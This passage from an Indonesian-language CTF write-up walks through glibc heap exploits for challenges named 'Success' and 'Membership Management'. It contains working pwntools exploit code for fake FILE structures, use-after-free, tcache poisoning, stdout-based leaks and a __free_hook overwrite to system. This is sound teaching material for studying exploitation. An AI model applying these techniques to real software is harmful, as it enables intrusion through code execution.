+<span style="color:#75715e"># 00:0000│   0x1555553268e8 (__free_hook) —▸ 0x155554f884e0 (system) ◂— test   rdi, rdi</span>
+</code></pre></div><p>Trigger dengan melakukan <code>free</code> ke chunk yang menyimpan string <code>/bin/sh</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># profit</span>
+delete(<span style="color:#ae81ff">0</span>)
+</code></pre></div><h2 id="flag-1">Flag</h2>
+<p><code>flag{this_has_gotta_be_the_longest_40_seconds_of_my_life_d543c7e3546b10c1d6ed0046db88787a}</code></p>
+<h1 id="success">Success</h1>
+<p>Pada dasarnya challange ini berdasarkan <a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">File Structure Exploit - GLIBC 2.27</a>. <em>Goal</em>-nya adalah untuk bypass <code>_IO_vtable_check</code> yang terdapat pada libc versi 2.24 keatas.</p>
+<h2 id="infomation-leaks">Infomation Leaks</h2>
+<p>Didapatkan pada fungsi <code>get_name</code>, karena menggunakan <code>read</code> yang tidak mengakhiri buffernya dengan nullbyte. Dengan ini, bisa membocorkan nilai-nilai yang ada distack (libc, etc) yang ada distack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># gdb-peda$ x/3gx 0x7fffffffec70 (buffer)</span>
+<span style="color:#75715e"># 0x7fffffffec70:	0x0000000000000000	0x0000555555555090 &lt;- pie</span>
+<span style="color:#75715e"># 0x7fffffffec80:	0x00001555553212a0	&lt;- libc symbols `_IO_file_jumps`</span>
+
+r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>)
+pie <span style="color:#f92672">=</span> uu64(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">8</span>:]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1090</span>
+
+r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>)
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> uu64(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0x10</span>:]) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_file_jumps&#39;</span>]
+
+info(f<span style="color:#e6db74">&#39;PIE 0x{pie:x}&#39;&#39;)</span>
+info(f<span style="color:#e6db74">&#39;LIBC 0x{libc.address:x}&#39;&#39;)</span>
+</code></pre></div><p>Bug nya ada di fungsi <code>fill_data</code>. Out-of-bound di <code>.bss</code>, karena <code>dword_202060</code> hanya berukuran 64, tetapi input <code>number</code> bisa sampai 64, ini akan meng-overwrite file pointer <code>numbers2</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">number <span style="color:#f92672">=</span> get_int(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Provide number of subjects: &#34;</span>);
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#66d9ef">if</span> ( number <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">||</span> number <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> )
+</span>    exit(<span style="color:#ae81ff">0</span>);
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> number; <span style="color:#f92672">++</span>i )
+</span>{
+    get_float(<span style="color:#ae81ff">1LL</span>, <span style="color:#f92672">&amp;</span>s);
+    dword_202060[i] <span style="color:#f92672">=</span> _mm_cvtsi128_si32(a1);
+}
+
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * .bss:0000000000202060 ; _DWORD dword_202060[64]
+</span><span style="color:#75715e"> * .bss:0000000000202060 dword_202060
+</span><span style="color:#75715e"> * .bss:0000000000202160 ; FILE *numbers2
+</span><span style="color:#75715e"> * .bss:0000000000202160 numbers2
+</span><span style="color:#75715e">**/</span>
+</code></pre></div><h2 id="crafting-fake-file-structure">Crafting Fake File Structure</h2>
+<p>Tidak ribet-ribet amat, karena <code>pwntools</code> sudah menyediakan :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">rdi <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+fake_vtable <span style="color:#f92672">=</span> (libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_file_jumps&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd8</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+
+<span style="color:#75715e"># nice pwntools again n again :)</span>
+fake_struct <span style="color:#f92672">=</span> FileStructure()
+fake_struct<span style="color:#f92672">.</span>_IO_buf_base   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+fake_struct<span style="color:#f92672">.</span>_IO_buf_end    <span style="color:#f92672">=</span> (rdi <span style="color:#f92672">-</span> <span style="color:#ae81ff">100</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+fake_struct<span style="color:#f92672">.</span>_IO_write_ptr  <span style="color:#f92672">=</span> (rdi <span style="color:#f92672">-</span> <span style="color:#ae81ff">100</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+fake_struct<span style="color:#f92672">.</span>_IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+fake_struct<span style="color:#f92672">.</span>_lock          <span style="color:#f92672">=</span> pie <span style="color:#f92672">+</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;ch&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>
+fake_struct<span style="color:#f92672">.</span>vtable         <span style="color:#f92672">=</span> fake_vtable
+
+payload <span style="color:#f92672">=</span> bytes(fake_struct) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+</code></pre></div><p>Karena terdapat space array <code>dword_202060[64]</code>, ini merupakan target yang bagus untuk menaruh <code>fake_file_struct</code> yang dibuat. Tantangannya adalah menulis dalam bentuk float. Berikut helper untuk konversi ke float,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">toFloat</span>(value):
+    <span style="color:#66d9ef">if</span> value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+    result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;f&#34;</span>, p32(value))[<span style="color:#ae81ff">0</span>]
+    <span style="color:#66d9ef">if</span> str(result) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;nan&#39;</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">return</span> result
+</code></pre></div><h2 id="exploit-2">Exploit</h2>
+<p>Writing time, wwww.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">8</span>):
+    target <span style="color:#f92672">=</span> u64(payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{toFloat(target &amp; 0xFFFFFFFF)}&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{toFloat(target &gt;&gt; 32)}&#39;</span>)
+
+<span style="color:#75715e"># padding</span>
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{toFloat(0)}&#39;</span>)
+
+<span style="color:#75715e"># overwrite file_stream_ptr numbers2 to our fake_file_struct.</span>
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{toFloat((pie + elf.sym.ch) &amp; 0xFFFFFFFF)}&#39;</span>)
+</code></pre></div><p><code>fclose</code> akan men-trigger <code>fake_file_struct</code> kita.</p>
+<h2 id="flag-2">Flag</h2>
+<p><code>flag{exploiting_files_with_floats_is_really_cool_cee02ce60690afdbdb1f4fcd20a03aaa}</code></p>
+<h1 id="membership-management">Membership Management</h1>
+<p>Heap exploitation challange GLIBC 2.31. Dengan fitur create, delete, edit dan tanpa view. Yaa, inti tantangan problem ini adalah tidak ada fungsi view.</p>
+<h2 id="analysist-2">Analysist</h2>
+<p>Subscribe, akan melakukan malloc sebesar 0x50. Pointer heap dari malloc ini ditampung di variable global array yang memiliki size 52. D an melakukan inisiasi <code>is_active</code> pada index array yang dipakai menjadi <code>1</code>. Ini menandakan chunk dalam kondisi terpakai.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> __usercall <span style="color:#a6e22e">subscribe</span>()
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp-Ch] [bp-Ch]@1
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { rep nop edx }
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">49</span>; <span style="color:#f92672">++</span>i )
+  {
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>is_active[i] )
+    {
+      gdata[i] <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x50uLL</span>);
+      puts(<span style="color:#e6db74">&#34;Done&#34;</span>);
+      result <span style="color:#f92672">=</span> i;
+      is_active[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+      <span style="color:#66d9ef">return</span> result;
+    }
+  }
+  <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;No more free slots!&#34;</span>);
+}
+</code></pre></div><p>Unsubscribe, akan melakukan <code>free</code> terhadap suatu index array, dan mengeset <code>is_active</code> pada index ini menjadi <code>0</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> __usercall <span style="color:#a6e22e">unsubscribe</span>()
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [sp-Ch] [bp-Ch]@1
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+  index <span style="color:#f92672">=</span> read_long();
+  <span style="color:#66d9ef">if</span> ( index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> index <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">50</span> )
+  {
+    result <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;There is no such member&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    result <span style="color:#f92672">=</span> is_active[index];
+    <span style="color:#66d9ef">if</span> ( result )
+    {
+      free(gdata[index]);
+      puts(<span style="color:#e6db74">&#34;Done&#34;</span>);
+      result <span style="color:#f92672">=</span> index;
+      is_active[index] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    }
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>Modify, melakukan <code>read</code> terhadap content member dengan constraint <code>0 &gt;= index &lt;= 50</code> yang mana index adalah pilihan dari user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> __usercall <span style="color:#a6e22e">modify</span>()
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> index; <span style="color:#75715e">// [sp-Ch] [bp-Ch]@1
+</span><span style="color:#75715e"></span>  
+  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+  index <span style="color:#f92672">=</span> read_long(<span style="color:#f92672">&amp;</span>v3);
+  <span style="color:#66d9ef">if</span> ( index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> index <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">50</span> )
+  {
+    result <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;There is no such member&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    printf(<span style="color:#e6db74">&#34;Content: &#34;</span>);
+    result <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, gdata[index], <span style="color:#ae81ff">0x32uLL</span>);
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><h2 id="bug">Bug</h2>
+<p>Ada di fungsi <code>unsubscribe</code>, karena global data array pada index yang telah di <code>free</code> tidak di-NULL kan. Sehingga, menimbulkan bug <code>use-after-free</code>. Dengan ini kita bisa mengedit chunk yang telah di <code>free</code> sehingga FD BK pointer chunk yang telah di <code>free</code> dapat kita kontrol untuk menunjuk kemanapun.</p>
+<h2 id="information-leaks">Information Leaks</h2>
+<p>Tantangannya adalah tidak ada fitur <code>view</code>. Leak bisa didapatkan dengan melakukan partial overwrite ke <code>_IO_2_1_stdout_</code>. Hal yang harus dilakukan adalah meng-corrupt <code>tcachebins</code> agar menunjuk ke <code>_IO_2_1_stdout_</code>. Cara ini membutuhkan bruteforce 1 byte dengan kemungkinan 1/16.</p>
+<h2 id="exploit-3">Exploit</h2>
+<p>Helper,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">subscribe</span>():
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unsubscribe</span>(idx):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{idx}&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify</span>(idx, data):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{idx}&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, data)
+</code></pre></div><p>Karena <code>subcsribe</code> hanya melakukan malloc sebesar 0x50, kita perlu chunk yang besar agar jika di <code>free</code>, akan masuk ke <code>unsortedbins</code> dan FD, BK pointer menunjuk ke <code>main_arena</code> untuk melakukan partial overwrite.</p>
+<p>Dengan <code>use-after-free</code>, edit FD pointer dari chunk yang sudah di<code>free</code> agar menunjuk ke <code>chunk_size</code> dari suatu chunk.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+    subscribe()
+
+unsubscribe(<span style="color:#ae81ff">0</span>)
+unsubscribe(<span style="color:#ae81ff">2</span>)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  2]: 0x555555559360 —▸ 0x5555555592a0 ◂— 0x0</span>
+</code></pre></div><p>Kondisi ketiga chunks,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">chunk[<span style="color:#ae81ff">0</span>]
+  <span style="color:#ae81ff">0x555555559290</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000061</span>
+  <span style="color:#ae81ff">0x5555555592a0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000555555559010</span> <span style="color:#f92672">&lt;--</span> tcachebins[<span style="color:#ae81ff">0x60</span>][<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>]
+  <span style="color:#ae81ff">0x5555555592b0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x5555555592c0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x5555555592d0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x5555555592e0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+
+chunk[<span style="color:#ae81ff">1</span>]
+  <span style="color:#ae81ff">0x5555555592f0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000061</span>
+  <span style="color:#ae81ff">0x555555559300</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559310</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559320</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559330</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559340</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+
+chunk[<span style="color:#ae81ff">2</span>]
+  <span style="color:#ae81ff">0x555555559350</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000061</span>
+  <span style="color:#ae81ff">0x555555559360</span>:   <span style="color:#ae81ff">0x00005555555592a0</span>  <span style="color:#ae81ff">0x0000555555559010</span> <span style="color:#f92672">&lt;--</span> tcachebins[<span style="color:#ae81ff">0x60</span>][<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>]
+  <span style="color:#ae81ff">0x555555559370</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559380</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x555555559390</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+  <span style="color:#ae81ff">0x5555555593a0</span>:   <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>Terlihat bahwa <code>chunks_size</code> dari chunks[1] terdapat pada alamat <code>0x5555555592f0</code>. Ini hanya berbeda 1 byte lsb dengan FD pointer chunks[2] <code>0x00005555555592a0</code>. Yang diperlukan hanya mengedit lsb FD pointer chunks[2] ini ke <code>0xf8</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">modify(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf8</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  2]: 0x555555559360 —▸ 0x5555555592f8 ◂— 0x61 /* &#39;a&#39; */</span>
+</code></pre></div><p>Sekarang menyiapakan chunks padding untuk chunks size besar nanti,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">subscribe() <span style="color:#75715e"># 0</span>
+subscribe() <span style="color:#75715e"># 2 -&gt; points to chunks[1]&#39;s size</span>
+
+<span style="color:#75715e"># chunk data for chunks_size 0x420</span>
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+    subscribe()
+
+<span style="color:#75715e"># for top chunk</span>
+subscribe()
+</code></pre></div><p>Edit size dari chunks[1] tadi menjadi <code>0x421</code> dan lakukan free, agar masuk ke <code>unsortedbins</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">modify(<span style="color:#ae81ff">2</span>, p64(<span style="color:#ae81ff">0x421</span>))
+unsubscribe(<span style="color:#ae81ff">1</span>)
+
+<span style="color:#75715e"># unsortedbin</span>
+<span style="color:#75715e"># all: 0x5555555592f0 —▸ 0x7ffff7fbabe0 (main_arena+96) ◂— 0x5555555592f0</span>
+</code></pre></div><p>Sekarang siapkan chunks yang berdekatan, untuk men-corrupt <code>tcachebins</code> agar menunjuk ke <code>_IO_2_1_stdout_</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># idx: 0 - 1 - 14 - 15 - 16</span>
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+    subscribe() 
+
+<span style="color:#75715e"># LSB OF _IO_2_1_stdout_</span>
+<span style="color:#75715e"># modify(16, b&#39;\xa0\xc6&#39;)</span>
+
+<span style="color:#75715e"># just for check</span>
+modify(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;XX&#39;</span>)
+
+<span style="color:#75715e"># pwndbg&gt; dq 0x555555559480-0x10</span>
+<span style="color:#75715e"># 0000555555559470     0000000000000000 0000000000000061</span>
+<span style="color:#75715e"># 0000555555559480     00007ffff7fb5858 00007ffff7fbabe0</span>
+<span style="color:#75715e">#                                    ^^ our chunk target</span>
+<span style="color:#75715e"># 0000555555559490     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 00005555555594a0     0000000000000000 0000000000000000</span>
+</code></pre></div><p>Aku memilih chunks[16] menjadi target aku untuk <code>_IO_2_1_stdout_</code>. Lalu siapkan free`d chunks yang berdekatan, agar chunks target dan salah FD pointer yang ada di <code>tcachabins list</code> hanya berbeda 1 byte saja di LSB-nya, sehingga bisa kita overwrite agar menunjuk ke target.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">unsubscribe(<span style="color:#ae81ff">14</span>)
+unsubscribe(<span style="color:#ae81ff">15</span>)
+unsubscribe(<span style="color:#ae81ff">1</span>)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  3]: 0x555555559300 —▸ 0x555555559420 —▸ 0x5555555593c0 ◂— 0x61 /* &#39;a&#39; */</span>
+</code></pre></div><p>FD Pointer dari chunks[1] yang menunjuk ke <code>0x555555559420</code> hanya berbeda 1 byte LSB-nya saja dengan chunk target kita yang berada di <code>0000555555559480</code>. Dengan mengubah 1 byte LSB dari chunks[1] menjadi <code>0x80</code>, <code>tcachebins</code> akan menunjuk ke chunk target kita.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">modify(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  3]: 0x555555559300 —▸ 0x555555559480 —▸ 0x7ffff7fb5858 </span>
+</code></pre></div><p>Sekarang, tinggal ubah target menjadi LSB dari <code>_IO_2_1_stdout_</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">modify(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xa0\xb6</span><span style="color:#e6db74">&#39;</span>)
+
+unsubscribe(<span style="color:#ae81ff">14</span>)
+unsubscribe(<span style="color:#ae81ff">15</span>)
+unsubscribe(<span style="color:#ae81ff">1</span>)
+
+modify(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  3]: 0x555555559300 —▸ 0x555555559480 —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span>
+</code></pre></div><p>NOTE: Saya mematikan ASLR untuk mempermudah melakukan debugging.</p>
+<p>Sekarang, overwrite file_struct <code>_IO_2_1_stdout_</code> agar mencetak suatu alamat libc. Dengan mengoverwite LSB dari <code>_IO_write_base</code> ke suatu address yang menyimpan address libc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+    subscribe()
+
+fake_struct <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xfbad1800</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x08</span><span style="color:#e6db74">&#39;</span>
+modify(<span style="color:#ae81ff">15</span>, fake_struct)
+</code></pre></div><p>Ketika <code>_IO_2_1_stdout_</code> berhasil dioverwrite, maka program akan mengoutputkan suatu memory yang ditunjuk oleh <code>_IO_write_base</code> dan bisa dikalkulasi untuk mendapat libc leak.</p>
+<p><img src="../images/leak.png" alt="leak"></p>
+<p>Karena leak sudah didapat, tinggal <code>tcache-poisoning</code> seperti biasa. Overwrite <code>__free_hook</code> menjadi <code>system</code>. Free chunk yang menyimpan string <code>/bin/sh</code> untuk dapat RCE !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">unsubscribe(<span style="color:#ae81ff">11</span>)
+unsubscribe(<span style="color:#ae81ff">12</span>)
+
+modify(<span style="color:#ae81ff">12</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x60 [  2]: 0x555555559720 —▸ 0x7ffff7fbdb28 (__free_hook) ◂— 0x0</span>
+
+subscribe()
+subscribe()
+
+modify(<span style="color:#ae81ff">12</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]))
+
+<span style="color:#75715e"># pwndbg&gt; tel &amp;__free_hook 1</span>
